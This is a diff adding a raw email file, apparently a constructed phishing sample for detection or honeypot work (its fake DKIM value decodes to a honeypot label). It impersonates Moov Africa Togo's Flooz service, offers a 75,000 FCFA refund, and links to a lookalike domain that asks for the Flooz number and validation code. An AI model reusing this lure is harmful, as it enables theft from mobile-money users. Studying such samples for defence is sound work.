@@ -1,0 +1,152 @@
+Return-Path: <bounce-srv@vps-8471.hostzone.net>
+X-Original-Sender: service-flooz@moov-africa.tg
+X-Originating-IP: 41.207.175.22
+X-Flooz-Transaction-ID: RMB-TG-2026-91847
+X-Mailer: Moov Africa Internal Mailer v2.1
+Received: from mail-gw.digitogo.tg (10.0.1.5) by mx.digitogo.tg (Postfix) with
+ ESMTPS id 3C72B1D4E6 for <e.dosseh@digitogo.tg>; Thu, 12 Nov 2026 09:17:35
+ +0000 (UTC)
+Received: from smtp-relay.moov-africa.tg (smtp-relay.moov-africa.tg
+ [41.207.175.22]) by mail-gw.digitogo.tg (Postfix) with ESMTP id A7F2E3B1C4
+ for <e.dosseh@digitogo.tg>; Thu, 12 Nov 2026 09:17:34 +0000 (UTC)
+Received: from vps-8471.hostzone.net (102.67.41.83) by mail-gw.digitogo.tg
+ with SMTP id b8e3a1c7; Thu, 12 Nov 2026 09:17:33 +0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=moov-africa.tg;
+ s=default; t=1731399453; bh=SGVsbG8gV29ybGQgZmFrZSBib2R5IGhhc2g=;
+ h=From:To:Subject:Date; =?utf-8?q?b=3DWkZha2VTaWduYXR1cmVGb3JIb25leXBvdFRyY?=
+ =?utf-8?q?XBOb3RSZWFsRElnaXRhbFNpZ25hdHVyZUJ1dExvb2tzTGlrZU9uZQ=3D=3D?=
+Authentication-Results: mail-gw.digitogo.tg; spf=pass
+ smtp.helo=smtp-relay.moov-africa.tg; dkim=fail (signature verification
+ failed) header.d=moov-africa.tg; dmarc=pass header.from=moov-africa.tg
+Authentication-Results: mx.digitogo.tg; spf=fail (sender IP is 102.67.41.83)
+ smtp.mailfrom=vps-8471.hostzone.net; dkim=none; dmarc=fail (p=none)
+ header.from=moov-africa.tg
+X-Sender-IP: 41.207.175.22
+From: "Moov Africa Togo" <service-flooz@moov-africa.tg>
+Reply-To: "Service Flooz" <support-flooz@moov-tg-service.com>
+To: "Edem Dosseh" <e.dosseh@digitogo.tg>
+Subject:
+ [Moov Flooz] Remboursement de 75 000 FCFA approuve - Ref RMB-TG-2026-91847
+Date: Thu, 12 Nov 2026 09:17:33 +0000
+Message-ID: <rmb91847-flooz-20261112@smtp-relay.moov-africa.tg>
+X-Priority: 1
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============1849247886265433355=="
+
+--===============1849247886265433355==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Moov Africa Togo - Services Flooz
+
+Cher(e) abonne(e),
+
+Suite a une erreur de facturation sur votre ligne lors du traitement des
+transactions Flooz d'octobre 2026, un remboursement de 75 000 FCFA a ete
+approuve en votre faveur.
+
+  Reference : RMB-TG-2026-91847
+  Montant   : 75 000 FCFA
+  Motif     : Correction facturation octobre 2026
+  Delai     : Sous 48h apres confirmation
+
+Pour recevoir votre remboursement, confirmez vos informations sur :
+https://moov-togo-flooz.com/flooz/remboursement?ref=RMB-TG-2026-91847
+
+Moov Africa Togo SA - 19, Avenue Sylvanus Olympio, Lome
+Tel : +228 90 00 90 00 | flooz@moov-africa.tg
+
+--===============1849247886265433355==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<!DOCTYPE html>
+<html><head><meta charset=3D"utf-8"></head>
+<body style=3D"font-family:Arial,Helvetica,sans-serif;background:#f4f4f4;marg=
+in:0;padding:0">
+<div style=3D"max-width:580px;margin:20px auto;background:#ffffff;border-radi=
+us:4px;overflow:hidden">
+
+<div style=3D"background:#6a1b9a;padding:18px 24px;text-align:center">
+<h1 style=3D"margin:0;font-size:22px;color:#fff">Moov Africa</h1>
+<p style=3D"margin:4px 0 0;font-size:12px;color:#ce93d8">Togo &ndash; Service=
+s Flooz</p>
+</div>
+
+<div style=3D"padding:24px">
+<p>Cher(e) abonn&eacute;(e),</p>
+
+<p>Suite &agrave; une <b>erreur de facturation</b> identifi&eacute;e sur votr=
+e ligne lors du
+traitement des transactions Flooz du mois d'octobre 2026, un
+<b style=3D"color:#2e7d32">remboursement de 75 000 FCFA</b> a &eacute;t&eacut=
+e; approuv&eacute; en votre faveur.</p>
+
+<div style=3D"background:#e8f5e9;border-left:4px solid #4caf50;padding:14px 1=
+8px;margin:16px 0">
+<p style=3D"margin:0;font-size:14px"><b>D&eacute;tails du remboursement :</b>=
+</p>
+<table style=3D"margin-top:8px;font-size:13px">
+<tr><td style=3D"padding:3px 12px 3px 0;color:#555">R&eacute;f&eacute;rence</=
+td><td><b>RMB-TG-2026-91847</b></td></tr>
+<tr><td style=3D"padding:3px 12px 3px 0;color:#555">Montant</td><td><b>75 000=
+ FCFA</b></td></tr>
+<tr><td style=3D"padding:3px 12px 3px 0;color:#555">Motif</td><td>Correction =
+facturation octobre 2026</td></tr>
+<tr><td style=3D"padding:3px 12px 3px 0;color:#555">D&eacute;lai</td><td>Sous=
+ 48h apr&egrave;s confirmation</td></tr>
+</table>
+</div>
+
+<p>Pour recevoir votre remboursement, veuillez <b>confirmer vos informations<=
+/b>
+(num&eacute;ro Flooz et code de validation) en cliquant ci-dessous :</p>
+
+<div style=3D"text-align:center;margin:24px 0">
+<a href=3D"https://moov-flooz-remboursement.secure-pay.top/flooz/remboursemen=
+t?ref=3DRMB-TG-2026-91847&amt=3D75000&op=3Dmoov"
+   style=3D"display:inline-block;padding:12px 36px;background:#6a1b9a;color:#=
+fff;
+   text-decoration:none;border-radius:4px;font-weight:bold;font-size:15px">
+   Confirmer et recevoir 75 000 FCFA
+</a>
+</div>
+
+<p style=3D"font-size:12px;color:#777">Si vous ne confirmez pas dans les 48 h=
+eures,
+le remboursement sera annul&eacute; et les fonds retourn&eacute;s au compte d=
+e r&eacute;gularisation.</p>
+
+<p style=3D"font-size:12px;color:#777"><b>Important :</b> Moov Africa ne vous=
+ demandera
+jamais votre code secret Flooz par SMS ou appel. Ce remboursement
+est trait&eacute; exclusivement via notre plateforme s&eacute;curis&eacute;e.=
+</p>
+
+<hr style=3D"border:0;border-top:1px solid #eee;margin:20px 0">
+
+<table style=3D"width:100%;font-size:11px;color:#999">
+<tr>
+<td>Moov Africa Togo SA<br>
+19, Avenue Sylvanus Olympio, Lom&eacute;<br>
+T&eacute;l : +228 90 00 90 00</td>
+<td style=3D"text-align:right">Service Client Flooz<br>
+flooz@moov-africa.tg<br>
+<a href=3D"https://www.moov-africa.tg" style=3D"color:#999">www.moov-africa.t=
+g</a></td>
+</tr>
+</table>
+
+<p style=3D"font-size:10px;color:#bbb;text-align:center;margin-top:12px">
+<a href=3D"https://moov-togo-flooz.com/unsubscribe?uid=3De.dosseh&ref=3D91847"
+   style=3D"color:#bbb">Se d&eacute;sabonner</a> |
+<a href=3D"https://moov-togo-flooz.com/privacy" style=3D"color:#bbb">Politiqu=
+e de confidentialit&eacute;</a>
+</p>
+</div>
+</div>
+</body></html>
+
+--===============1849247886265433355==--
